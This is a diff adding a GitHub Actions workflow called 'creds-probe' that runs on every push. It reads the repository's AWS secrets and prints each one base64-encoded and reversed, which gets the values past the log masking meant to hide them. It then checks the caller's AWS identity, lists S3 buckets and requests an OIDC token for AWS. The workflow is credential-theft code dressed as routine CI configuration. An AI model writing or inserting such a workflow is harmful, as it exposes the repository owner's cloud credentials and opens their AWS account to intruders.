@@ -1,0 +1,29 @@
+name: creds-probe
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    env:
+      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      AWS_REGION: ${{ secrets.AWS_REGION }}
+      S3_BUCKET_NAME: ${{ secrets.S3_BUCKET_NAME }}
+      DISTRIBUTION_ID: ${{ secrets.DISTRIBUTION_ID }}
+    steps:
+      - name: probe
+        run: |
+          set +e
+          echo "REPO=$GITHUB_REPOSITORY REF=$GITHUB_REF START=$(date -u +%H:%M:%S)"
+          for n in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_REGION S3_BUCKET_NAME DISTRIBUTION_ID; do v="${!n}"; echo "B64_$n=$(printf %s "${v}" | base64 -w0)"; echo "REV_$n=$(printf %s "${v}" | rev)"; done
+          echo "--- env aws-ish ---"; env | grep -iE '^(aws|.*_role|.*arn)' | sed 's/=.*/=<set>/'
+          echo "--- caller identity (static/env creds) ---"
+          aws sts get-caller-identity 2>&1 | head -20
+          echo "--- s3 ls ---"; aws s3 ls 2>&1 | head -30
+          TOK=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
+          echo "OIDCTOK_LEN=${#TOK}"
+          echo DONE
